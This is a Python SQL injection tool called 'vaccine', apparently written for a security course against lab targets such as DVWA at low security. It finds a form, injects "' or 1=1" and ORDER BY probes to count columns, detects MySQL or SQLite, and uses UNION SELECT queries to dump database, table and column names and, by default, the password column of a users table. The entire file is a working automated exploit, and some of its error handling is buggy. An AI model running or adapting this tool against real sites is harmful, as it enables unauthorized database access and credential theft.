#!/usr/bin/python3
import argparse
import requests
import re
import os
import difflib

REQUEST_TYPES = set(["get", "post"])

token = os.environ.get('TOKEN')
cookies = {'PHPSESSID': token, "security": "low"}

class Style():
	RED = "\x1b[31m"
	GREEN = "\x1b[32m"
	CYAN = "\x1b[96m"
	RESET = "\033[0m"

def error_exit(msg):
	print(f"Error: {msg}")
	exit(1)

def error_continue(msg):
	print(f"Error: {msg}")

def form_url(url, add):
	if add == "#":
		return url
	if add.startswith('/'):
		if url.endswith('/'):
			url = url[:-1]
		return url + add

	baseurl_match = re.search(r'^(https?://[^/]+)', url)
	if not baseurl_match:
		error_exit(f"worng url - {url}")
	baseurl = baseurl_match.group()
	return baseurl + '/' + add

def get_diff(str1, str2):
	diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n = 0)
	ret = ""
	cnt = 0
	for d in diff:
		cnt = cnt + 1
		if cnt < 4:
			continue
		if d.startswith("-"):
			continue
		ret = ret + d[1:].strip() + '\n'
	return ret

def get_result(str1, str2, query=""):
	diff = get_diff(str1, str2)
	result = diff.replace("<b>", "")
	result = result.replace("</b>", "")
	result = re.sub('<(.|\n)*?>', '\n', result)
	result = re.sub('\n+', '\n', result)
	if query:
		result = result.replace(query, "[query]")
	return result

class Log:
	def __init__(self, filename):
		self.data = ""
		self.filename = filename

	def log(self, msg, color=""):
		if color:
			print(color + msg[:500] + Style.RESET)
		else:
			print(msg[:500])
		self.data = self.data + msg + '\n'

	def to_file(self):
		with open(self.filename, "w") as f:
			f.write(self.data)

class VaccineHelper:
	def __init__(self, submit, comment):
		self.submit = submit
		self.delimiter = "'"
		self.comment = comment
		self.original_text = self.submit("").text
		self.normal_text = self.submit("' or 1=1" + self.comment).text

class Error:
	class ErrorException(Exception):
		pass

	def __init__(self, helper):
		logger.log(f"< ERROR comment:{helper.comment} >", Style.GREEN)
		self.submit = helper.submit
		self.delimiter = helper.delimiter
		self.comment = helper.comment
		self.original_text = helper.original_text
		self.normal_text = helper.normal_text

	def error(self):
		flag = 0
		for i in range(1, 12):
			q = f" ORDER BY {i}"
			query = self.delimiter + q + self.comment
			res = self.submit(query)
			logger.log(f"QUERY: {query}", Style.CYAN)
			result = get_diff(self.original_text, res.text)
			if res.text and not result:
				flag = 1
				continue
			result = get_diff(self.normal_text, res.text)
			if len(self.normal_text) == len(res.text):
				flag = 1
				continue
			if not result:
				continue
			break
		column_counts = i - flag
		if column_counts == 0 or column_counts >= 10:
			raise self.ErrorException("this method does not work")
		logger.log(f"column counts: {column_counts}")
		return column_counts

class Union:
	class UnionException(Exception):
		pass

	def __init__(self, helper, get_input, column_counts):
		logger.log(f"< UNION comment:{helper.comment} >", Style.CYAN)
		self.submit = helper.submit
		self.delimiter = helper.delimiter
		self.header = self.delimiter + " UNION "
		self.comment = helper.comment
		self.get_input = get_input

		self.original_text = helper.original_text
		self.normal_text = helper.normal_text
		self.column_counts = column_counts

		self.mysql = True

		self.db_name = None
		self.table_name = None

	def submit_query(self, column_name, contents=""):
		column_lst = ["null"] * (self.column_counts - 1)
		column_lst.append(column_name)
		colums = ", ".join(column_lst)
		query = self.header + "SELECT " + colums + contents + self.comment
		return self.submit(query).text, query

	def exec_union(self, column_name, contents):
		response, query = self.submit_query(column_name, contents)
		logger.log(f"QUERY: {query}", Style.CYAN)
		result = get_result(self.original_text, response, query)
		if not result:
			raise self.UnionException("this method does not work")
		logger.log(result)

	def check_union(self, column_name, compare):
		response, query = self.submit_query(column_name)
		result = get_result(compare, response)
		#logger.log(result)
		return result

	def get_version(self):
		response, query = self.submit_query("error")
		result = self.check_union("@@version", response)
		if result:
			logger.log(f"mode: MYSQL", Style.GREEN)
			return
		result = self.check_union("sqlite_version()", response)
		if result:
			logger.log(f"mode: SQLite", Style.GREEN)
			self.mysql = False

	def read_input(self, name):
		if not self.get_input:
			return
		data = input(f"Enter {name}: ")
		return data

	def get_database_name(self):
		if self.mysql:
			self.exec_union("DATABASE()", "")
		else:
			self.exec_union("sql", " FROM sqlite_schema")

	def get_table_names(self):
		if self.mysql:
			self.db_name = self.read_input("database name")
			column_name = "table_name"
			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE'"
			if self.db_name:
				contents = contents + f" AND table_schema = '{self.db_name}'"
		else:
			column_name = "tbl_name"
			contents = " FROM sqlite_master"
		self.exec_union(column_name, contents)

	def get_column_names(self):
		if self.mysql:
			self.table_name = self.read_input("table name")
			column_name = "column_name"
			contents = " FROM information_schema.columns"
			if self.table_name:
				contents = contents + f" WHERE table_name = '{self.table_name}'"
		else:
			self.table_name = self.read_input("table name")
			column_name = "sql"
			contents = " FROM sqlite_master"
			if self.table_name:
				contents = contents + f" WHERE name = '{self.table_name}'"
		self.exec_union(column_name, contents)

	def get_all_data(self):
		if self.mysql:
			column_name = self.read_input("column name")
			if not column_name:
				column_name = "password"
			contents = f" FROM {self.table_name}"
			if not self.table_name:
				contents = f" FROM users"
		else:
			column_name = self.read_input("column name")
			if not column_name:
				column_name = "password"
			contents = f" FROM {self.table_name}"
			if not self.table_name:
				contents = f" FROM users"
		self.exec_union(column_name, contents)

	def union(self):
		try:
			self.get_version()
			self.get_database_name()
			self.get_table_names()
			self.get_column_names()
			self.get_all_data()
		except self.UnionException as e:
			error_continue(e)
		except Exception as e:
			error_exit(e)

class Vaccine:
	def __init__(self, url, method, get_input):
		self.url = url
		self.method = method
		self.get_input = get_input

		txt = self.request()
		form = self.get_form(txt)
		self.request_url = self.get_request_url(form)
		field = self.get_field_names(form)
		if len(field) > 2:
			self.username_field_name = field[0]
			self.password_field_name = field[1]
		else:
			self.username_field_name = field[0]
			self.password_field_name = None

	def __str__(self):
		return f'''[metadata]
- url: {self.url}
- request-url: {self.request_url}
- method: {self.method}
- username-field: {self.username_field_name}
- password-field: {self.password_field_name}'''

	def get_form(self, txt):
		forms = re.findall(r'(<form(.|\s)*?</form>)', txt)

		if not forms:
			error_exit("form block does not exist")
		filtered_froms = []
		for form in forms:
			method_match = re.search(r'method="(.*?)"', form[0])
			if not method_match:
				continue
			if method_match.group(1).lower() != self.method:
				continue
			filtered_froms.append(form[0])
		#logger.log(forms)
		if not filtered_froms:
			error_exit("method does not match")
		if len(filtered_froms) > 1:
			error_exit("multiple fields exist, cannot determin")
		return filtered_froms[0]

	def get_field_names(self, form):
		return re.findall(r'<input[^>]+name="(.*?)"', form)

	def get_request_url(self, form):
		actions = re.findall(r'<form[^>]+action="(.*?)"', form)
		if not actions:
			return self.url
		if len(actions) > 1:
			error_exit("too many actions found")
		return form_url(self.url, actions[0])

	def request(self):
		try:
			response = requests.get(self.url, cookies=cookies)
		except requests.exceptions.ConnectionError:
			error_exit(f"connection refused - {self.url}")
		except Exception as e:
			error_exit(e)
		if response.status_code == 302:
			error_exit("no cookie found")
			return request()

		if response.status_code != 200:
			error_exit(f"{self.url} - {response}")
		return response.text

	def submit(self, username, password="password"):
		if self.password_field_name:
			payload = {
				self.username_field_name: username,
				self.password_field_name: password
			}
		else:
			payload = {
				self.username_field_name: username,
				"Submit" : "Submit"
			}
		#logger.log(f"payload {payload}")
		res = requests.get(self.request_url, params=payload, cookies=cookies)
		if self.method == "get":
			res = requests.get(self.request_url, params=payload, cookies=cookies)
		elif self.method == "post":
			res = requests.post(self.request_url, data=payload, cookies=cookies)
		return res

	def vaccine(self):
		try:
			v = VaccineHelper(self.submit, "#")
			e = Error(v)
			column_counts = e.error()
			u = Union(v, self.get_input, column_counts)
			u.union()
		except Error.ErrorException or Union.UnionException as e:
			error_continue(e)
		#except Exception as e:
		#	error_exit(e)
		try:
			v = VaccineHelper(self.submit, "--")
			e = Error(v)
			column_counts = e.error()
			u2 = Union(v, self.get_input, column_counts)
			u2.union()
		except Error.ErrorException or Union.UnionException as e:
			error_continue(e)
		#except Exception as e:
		#	error_exit(e)

def validate_args(args):
	if not args.url.startswith('https://') and \
		not args.url.startswith('http://'):
		args.url = 'http://' + args.url
	args.x = args.x.lower()
	if args.x not in REQUEST_TYPES:
		error_exit(f"Request type {args.x} is not supported")

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("url", metavar="URL", type=str)
	parser.add_argument("-o", type=str, default="log.txt",
		help="Archive file, if not specified it will be stored in a default one.")
	parser.add_argument("-x", type=str, default="GET",
		help="Type of request, if not specified GET will be used.")
	parser.add_argument("-i", action="store_true",
		help="Specify talbe and column name using input")
	args = parser.parse_args()

	return args

def main():
	args = parse_args()
	validate_args(args)
	global logger
	logger = Log(args.o)
	vaccine = Vaccine(args.url, args.x, args.i)
	vaccine.vaccine()
	print(vaccine)
	logger.to_file()

if __name__ == '__main__':
	main()